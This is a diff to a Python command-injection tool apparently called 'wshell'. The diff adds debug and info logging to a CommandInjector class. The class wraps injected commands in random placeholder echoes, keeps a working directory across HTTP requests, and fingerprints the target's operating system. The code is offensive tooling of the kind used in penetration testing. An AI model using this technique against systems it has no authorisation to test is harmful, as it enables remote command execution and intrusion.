@@ -11,6 +11,9 @@ from wshell.errors import CommandExecutionError, OsDetectionError, TargetUnreach
 
 # Disable warnings related to unverified SSL certs
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
+from wshell.log import logger
+
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 
@@ -73,9 +76,11 @@ class CommandInjector:
         #   uid=0(root) gid=0(root) groups=0(root)
         #
         placeholder = hashlib.md5(f"wshell-{random.random()}".encode("utf-8")).hexdigest()
+        logger.debug(f"Using placeholder: {placeholder}")
         # To make `cd` command works over HTTP shell we need to change to the desired directory
         # before the execution of every command
         cmd = f"cd {self.cwd}{self.COMMAND_DELIMITER}{cmd}"
+        logger.debug(f"Executing command: {cmd}")
         cmd = f"echo {placeholder}{self.COMMAND_DELIMITER}{cmd}{self.COMMAND_DELIMITER}echo {placeholder}"
 
         # We don't know where the command placeholder is, so just try to resolve it anywhere
@@ -111,6 +116,7 @@ class CommandInjector:
         )
 
         if not match:
+            logger.debug(f"Got unexpected HTTP response:\n{response.text}")
             raise CommandExecutionError("Failed to parse command output")
 
         command_output = match.group("command_output")
@@ -125,12 +131,16 @@ class CommandInjector:
         #   Linux:       'wshell\n'
         #   Windows CMD: 'wsh${WSHELL}ell\r\n'
         #   Windows PSH: 'wshell\r\n'
+        logger.info("Target OS not specified, trying to automatically detect it")
         cmd_output = self.execute("echo wsh${WSHELL}ell", strip=False)
         if cmd_output == "wshell\n":
             self.OS = OSEnum.LINUX
+            logger.info("Target OS detected as Linux")
         elif cmd_output == "wsh${WSHELL}ell\r\n":
             self.OS = OSEnum.WIN_CMD
+            logger.info("Target OS detected as Windows (Command prompt)")
         elif cmd_output == "wshell\r\n":
+            logger.info("Target OS detected as Windows (Powershell)")
             self.OS = OSEnum.WIN_PSH
         else:
             raise OsDetectionError(f"Unrecognized output: '{cmd_output}'")
@@ -160,6 +170,7 @@ class CommandInjector:
             directory = f"{self.cwd}{self.PATH_DELIMITER}{directory}"
 
         self.cwd = self.execute(f"cd {directory}{self.COMMAND_DELIMITER}{self.CURRENT_DIRECTORY_COMMAND}")
+        logger.debug(f"Directory changed to: {self.cwd}")
         return self.cwd
 
     def current_directory(self):
